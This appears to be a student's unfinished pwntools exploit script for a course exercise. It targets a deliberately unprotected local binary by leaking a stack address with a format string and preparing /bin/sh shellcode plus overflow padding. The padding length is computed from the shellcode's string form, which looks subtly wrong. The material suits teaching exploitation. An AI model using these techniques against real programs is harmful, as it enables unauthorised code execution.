'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     PCP18: Vuln
File Description:  Start with red, slowly add security until it's unpwnable

Checksec info:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   50) Symbols       No    0               2               pwnme

File info:
pwnme: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=dca08531b0edeffb8c5c694d821ea0ddac619f27, for GNU/Linux 3.2.0, not stripped

Radare2:
afl --> list all functions

%3$p is a stack address with PIE off
'''

# Import libraries
from pwn import *

# ELF of current runnnig process + libc of it
elf = ELF("./pwnme",checksec=False)
libc = elf.libc

# Knows the context to debug in
DEBUG = False
if(DEBUG):
    context.log_level = "debug"
context.arch = "i386"
context.binary = elf

# Variables for shellcode
shell = asm(shellcraft.sh())
padding = b'a' * (264 - len(str(shell)))
padOverBP = b'a'*4
stackLeakFormat = b"%3$p"

# start process
p=process("./pwnme")
p.send(stackLeakFormat)
resp = p.recvuntil(b'0x')     # Should be "Starting Echo Machine" with leak